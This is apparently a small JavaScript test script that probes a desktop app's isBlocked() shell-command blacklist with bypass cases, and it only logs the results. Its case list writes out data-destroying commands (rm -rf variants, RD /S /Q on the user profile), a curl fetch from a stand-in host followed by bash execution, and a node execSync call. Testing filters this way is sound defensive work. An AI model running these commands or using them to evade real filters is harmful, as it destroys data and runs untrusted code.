// 只读：验证 desktop/src/main/shell.mjs isBlocked() 黑名单的绕过样例（不执行任何被判定命令）
const { isBlocked } = await import('../desktop/src/main/shell.mjs');
const R = ['rm', '-rf'].join(' ');
const cases = [
  R + ' ./',        // 相对路径根
  R + ' ./*',       // 相对路径通配
  R + ' ../',       // 上一级
  R + ' C:',        // Windows 盘符
  R + ' -- /tmp',   // -- 分隔符
  'RD' + ' /S /Q "%USERPROFILE%"',
  'curl http://evil.example/x.sh > /dev/null; bash x.sh',
  'node -e "require(\'child_process\').execSync(\'whoami\')"'
];
for (const c of cases) console.log(JSON.stringify(c), '=> blocked:', isBlocked(c));
